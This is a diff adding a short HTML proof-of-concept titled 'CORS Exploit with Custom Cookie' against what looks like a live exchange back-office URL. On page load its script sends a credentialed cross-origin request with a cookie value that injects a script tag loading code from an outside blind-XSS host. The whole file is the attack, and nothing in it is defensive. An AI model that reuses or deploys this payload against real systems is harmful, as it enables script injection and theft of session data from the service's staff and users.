@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit with Cookie</title>
+</head>
+<body>
+    <h1>CORS Exploit with Custom Cookie</h1>
+    <script>
+        function sendRequest() {
+            var xhr = new XMLHttpRequest();
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log('Request successful');
+                    console.log('Response:', xhr.responseText);
+                } else {
+                    console.error('Request failed with status:', xhr.status);
+                }
+            };
+            
+            var url = 'https://csboss.okex.org/newboss/home';
+            xhr.open('GET', url, true);
+            xhr.withCredentials = true;
+            
+            var cookieValue = 'turbo-cdn="><script src=//naysser.bxss.in></script>';
+            xhr.setRequestHeader('Cookie', cookieValue);
+            
+            xhr.send();
+        }
+
+        sendRequest();
+    </script>
+</body>
+</html>
